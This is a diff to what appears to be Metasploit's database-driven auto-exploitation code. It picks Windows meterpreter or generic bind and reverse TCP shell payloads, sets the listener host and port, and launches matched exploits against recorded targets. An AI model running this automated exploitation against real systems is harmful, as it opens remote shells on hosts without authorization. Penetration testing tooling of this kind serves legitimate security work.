@@ -301,18 +301,27 @@ class Db
 						mod.datastore['RPORT'] = xref[0].to_s
 
 						if (code == :bind)
-							mod.datastore['PAYLOAD'] = 'generic/shell_bind_tcp'
 							mod.datastore['LPORT']   = (rand(0x8fff) + 4000).to_s
+							if(mod.fullname =~ /\/windows\//)
+								mod.datastore['PAYLOAD'] = 'windows/meterpreter/bind_tcp'
+							else
+								mod.datastore['PAYLOAD'] = 'generic/shell_bind_tcp'
+							end
 						end
 						
 						if (code == :conn)
-							mod.datastore['PAYLOAD'] = 'generic/shell_reverse_tcp'
 							mod.datastore['LHOST']   = 	Rex::Socket.source_address(xref[2])
 							mod.datastore['LPORT']   = 	(rand(0x8fff) + 4000).to_s
 							
 							if (mod.datastore['LHOST'] == '127.0.0.1')
 								print_status("Failed to determine listener address for target #{xref[2]}...")
 								next
+							end
+							
+							if(mod.fullname =~ /\/windows\//)
+								mod.datastore['PAYLOAD'] = 'windows/meterpreter/reverse_tcp'
+							else
+								mod.datastore['PAYLOAD'] = 'generic/shell_reverse_tcp'
 							end
 						end
 						
@@ -324,7 +333,7 @@ class Db
 							end
 						end
 						
-						
+
 						next if not mod.autofilter()
 
 						print_status("(#{idx}/#{matches.length}): Launching #{xref[3]} against #{xref[2]}:#{mod.datastore['RPORT']}...")
